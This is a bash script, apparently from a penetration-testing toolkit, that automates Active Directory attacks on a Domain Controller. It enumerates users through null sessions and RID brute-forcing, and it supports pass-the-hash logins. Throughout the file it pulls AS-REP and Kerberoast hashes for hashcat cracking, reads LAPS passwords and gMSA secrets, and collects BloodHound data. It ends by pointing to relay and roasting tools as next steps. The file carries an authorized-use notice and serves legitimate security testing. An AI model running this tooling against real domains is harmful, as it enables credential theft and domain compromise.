#!/usr/bin/env bash
#
# ad-enum.sh - Active Directory enumeration orchestrator
# -----------------------------------------------------------------------------
# Layered domain enumeration against a Domain Controller. Works unauthenticated
# (null / guest) and ramps up automatically when you supply credentials:
#   1. SMB recon (netexec smb): host/domain info, SMB signing, null-session
#      shares, and RID-brute user enumeration when anonymous bind is allowed.
#   2. LDAP recon (netexec ldap): users, groups, password policy, machine
#      accounts, AS-REP-roastable & Kerberoastable accounts, trusts, LAPS,
#      gMSA, and delegation flags (when authenticated).
#   3. ldapdomaindump: full HTML/JSON dump of the directory (authenticated).
#   4. BloodHound collection (bloodhound-python -c All): produces a .zip ready
#      to drag into BloodHound CE (http://127.0.0.1:8080).
#   5. enum4linux-ng: broad fallback sweep.
#
# Everything is saved under a per-target results directory. Missing tools are
# warned about and skipped (never fatal).
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: Run only against domains you own or are explicitly
# permitted to test (hackathon range, lab, client engagement with scope).
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./ad-enum.sh -d <domain> -i <dc_ip> [-u user] [-p pass | -H lmhash:nthash] [-o out]
#
# EXAMPLES:
#   ./ad-enum.sh -d corp.local -i 10.10.10.10                       # null/guest
#   ./ad-enum.sh -d corp.local -i 10.10.10.10 -u jdoe -p 'P@ss'     # creds
#   ./ad-enum.sh -d corp.local -i 10.10.10.10 -u jdoe -H :aad3b...  # pass-the-hash
#
# DEPENDENCIES (degraded gracefully):
#   netexec (nxc)        - core SMB/LDAP enumeration
#   ldapdomaindump       - directory dump (authenticated)
#   bloodhound-python    - BloodHound CE collector
#   enum4linux-ng        - fallback sweep
# -----------------------------------------------------------------------------

set -euo pipefail

c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

DOMAIN="" DC_IP="" USER="" PASS="" HASH="" OUT=""
usage(){ sed -n '2,40p' "$0"; exit 1; }
while getopts "d:i:u:p:H:o:h" o; do case "$o" in
  d) DOMAIN=$OPTARG;; i) DC_IP=$OPTARG;; u) USER=$OPTARG;;
  p) PASS=$OPTARG;; H) HASH=$OPTARG;; o) OUT=$OPTARG;; *) usage;;
esac; done
[ -z "$DOMAIN" ] || [ -z "$DC_IP" ] && { c_err "need -d <domain> and -i <dc_ip>"; usage; }

# netexec binary name varies (nxc / netexec / crackmapexec)
NXC=""; for b in nxc netexec crackmapexec cme; do have "$b" && { NXC=$b; break; }; done

# Build the shared netexec auth args
AUTH=()
if [ -n "$USER" ]; then
  AUTH+=( -u "$USER" )
  if   [ -n "$HASH" ]; then AUTH+=( -H "$HASH" )
  elif [ -n "$PASS" ]; then AUTH+=( -p "$PASS" )
  else AUTH+=( -p '' ); fi
  MODE="authenticated as '$USER'"
else
  AUTH+=( -u '' -p '' ); MODE="unauthenticated (null session)"
fi

OUT=${OUT:-"./ad-enum_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"}
mkdir -p "$OUT"; cd "$OUT"
c_info "Target domain : $DOMAIN"
c_info "DC IP         : $DC_IP"
c_info "Auth mode     : $MODE"
c_info "Output dir    : $(pwd)"
[ -z "$NXC" ] && c_warn "netexec not found - SMB/LDAP steps will be skipped"

# ---- 1. SMB ----------------------------------------------------------------
if [ -n "$NXC" ]; then
  c_step "SMB recon"
  $NXC smb "$DC_IP" "${AUTH[@]}" 2>&1 | tee smb_info.txt || c_warn "smb info failed"
  c_info "Enumerating shares..."
  $NXC smb "$DC_IP" "${AUTH[@]}" --shares 2>&1 | tee smb_shares.txt || true
  c_info "Password policy..."
  $NXC smb "$DC_IP" "${AUTH[@]}" --pass-pol 2>&1 | tee pass_policy.txt || true
  if [ -z "$USER" ]; then
    c_info "Attempting RID-brute user enumeration (anonymous)..."
    $NXC smb "$DC_IP" -u '' -p '' --rid-brute 2>&1 | tee rid_brute.txt || true
    grep -iE 'SidTypeUser' rid_brute.txt 2>/dev/null | sed -E 's/.*\\\\([^ ]+) .*/\1/' | sort -u > users.txt || true
    [ -s users.txt ] && c_ok "Recovered $(wc -l < users.txt) usernames -> users.txt"
  fi
fi

# ---- 2. LDAP ---------------------------------------------------------------
if [ -n "$NXC" ]; then
  c_step "LDAP recon"
  $NXC ldap "$DC_IP" "${AUTH[@]}" --users 2>&1 | tee ldap_users.txt || true
  # harvest usernames from authenticated listing too
  awk '/-Username-/{f=1;next} f&&NF{print $5}' ldap_users.txt 2>/dev/null | sort -u >> users.txt 2>/dev/null || true
  sort -u -o users.txt users.txt 2>/dev/null || true
  $NXC ldap "$DC_IP" "${AUTH[@]}" --groups 2>&1 | tee ldap_groups.txt || true
  if [ -n "$USER" ]; then
    c_info "Hunting roastable / delegation / LAPS / gMSA..."
    $NXC ldap "$DC_IP" "${AUTH[@]}" --asreproast asrep.txt        2>&1 | tee -a ldap_asrep.txt   || true
    $NXC ldap "$DC_IP" "${AUTH[@]}" --kerberoasting kerb.txt      2>&1 | tee -a ldap_kerb.txt    || true
    $NXC ldap "$DC_IP" "${AUTH[@]}" --trusted-for-delegation      2>&1 | tee delegation.txt      || true
    $NXC ldap "$DC_IP" "${AUTH[@]}" --admin-count                 2>&1 | tee admincount.txt      || true
    $NXC ldap "$DC_IP" "${AUTH[@]}" -M laps                       2>&1 | tee laps.txt            || true
    $NXC ldap "$DC_IP" "${AUTH[@]}" --gmsa                        2>&1 | tee gmsa.txt            || true
    [ -s asrep.txt ] && c_ok "AS-REP hashes -> $(pwd)/asrep.txt  (crack: roast.sh or hashcat -m 18200)"
    [ -s kerb.txt ]  && c_ok "Kerberoast hashes -> $(pwd)/kerb.txt  (crack: hashcat -m 13100)"
  fi
fi

# ---- 3. ldapdomaindump (authenticated) -------------------------------------
if [ -n "$USER" ] && have ldapdomaindump; then
  c_step "ldapdomaindump"
  mkdir -p ldd
  CRED="$DOMAIN/$USER"
  if [ -n "$HASH" ]; then DDAUTH=( -u "$CRED" -p ":${HASH##*:}" )
  else DDAUTH=( -u "$CRED" -p "$PASS" ); fi
  ldapdomaindump "${DDAUTH[@]}" -o ldd "ldap://$DC_IP" 2>&1 | tail -5 || c_warn "ldapdomaindump failed"
  [ -f ldd/domain_users.html ] && c_ok "Directory dumped -> $(pwd)/ldd/ (open *.html)"
fi

# ---- 4. BloodHound collection ----------------------------------------------
if [ -n "$USER" ] && have bloodhound-python; then
  c_step "BloodHound collection (-c All)"
  mkdir -p bloodhound
  BHAUTH=( -u "$USER" -d "$DOMAIN" -dc "$DOMAIN" -ns "$DC_IP" )
  [ -n "$HASH" ] && BHAUTH+=( --hashes "$HASH" ) || BHAUTH+=( -p "$PASS" )
  ( cd bloodhound && bloodhound-python "${BHAUTH[@]}" -c All --zip 2>&1 | tail -8 ) || c_warn "bloodhound-python failed"
  ZIP=$(ls -t bloodhound/*.zip 2>/dev/null | head -1 || true)
  [ -n "$ZIP" ] && c_ok "BloodHound data -> $ZIP  (upload at http://127.0.0.1:8080)"
fi

# ---- 5. enum4linux-ng fallback ---------------------------------------------
if have enum4linux-ng; then
  c_step "enum4linux-ng sweep"
  E4=( -A ); [ -n "$USER" ] && E4=( -A -u "$USER" -p "${PASS:-}" )
  enum4linux-ng "${E4[@]}" "$DC_IP" > enum4linux.txt 2>&1 || true
  c_ok "enum4linux-ng output -> $(pwd)/enum4linux.txt"
fi

c_step "DONE"
c_ok "All results under: $(pwd)"
[ -s users.txt ] && c_info "Next: roast.sh -d $DOMAIN -i $DC_IP -U $(pwd)/users.txt   (AS-REP roast, no creds needed)"
c_info "Next: adcs-hunt.sh (ADCS) · coerce-relay.sh (relay) · upload BloodHound zip for path analysis"
